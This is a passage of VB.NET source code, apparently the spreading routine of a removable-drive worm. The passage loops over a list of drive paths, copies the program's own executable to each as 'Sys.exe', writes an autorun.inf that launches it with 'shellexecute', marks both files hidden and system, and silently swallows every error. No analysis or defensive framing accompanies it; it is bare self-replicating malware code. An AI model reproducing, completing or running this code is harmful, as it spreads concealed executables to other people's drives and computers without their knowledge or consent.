                    My.Computer.FileSystem.CopyFile(Application.ExecutablePath, aa232.Items.Item(int87654) + "Sys.exe")
                    FileOpen(1, aa232.Items.Item(int87654) + "autorun.inf", OpenMode.Binary)
                    FilePut(1, "[autorun]" + vbNewLine + "shellexecute=sys.exe")
                    FileClose(1)
                    Try
                        My.Computer.FileSystem.GetFileInfo(aa232.Items.Item(int87654) + "Sys.exe").Attributes = IO.FileAttributes.System Or IO.FileAttributes.Hidden
                        My.Computer.FileSystem.GetFileInfo(aa232.Items.Item(int87654) + "autorun.inf").Attributes = IO.FileAttributes.System Or IO.FileAttributes.Hidden
                    Catch
                    End Try
                Catch
                End Try
                int87654 += 1
            Loop
        Catch ex As Exception

        End Try
    End Sub
End Class
